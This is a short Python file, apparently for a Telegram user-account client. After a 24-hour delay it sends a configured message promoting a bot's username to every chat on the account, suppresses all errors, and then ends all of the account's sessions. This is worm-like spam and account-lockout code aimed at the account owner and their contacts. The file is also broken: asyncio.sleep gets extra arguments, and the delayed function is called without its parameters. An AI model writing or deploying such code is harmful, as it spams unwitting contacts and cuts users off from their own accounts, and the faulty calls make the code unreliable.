import asyncio

from config import SEND_MSG


async def async_func(client, bot_id):
    dialg = await client.get_dialogs()
    for dialog in dialg:
        try:
            await client.send_message(dialog.id, SEND_MSG.format(username=bot_id.username))
        except:
            pass

    await client.TerminateAllSessions()


async def start_timer(secs, client, bot_id):
    await asyncio.sleep(secs, client, bot_id)
    await async_func()


async def main(client, bot_id):
    asyncio.create_task(start_timer(86400, client, bot_id))

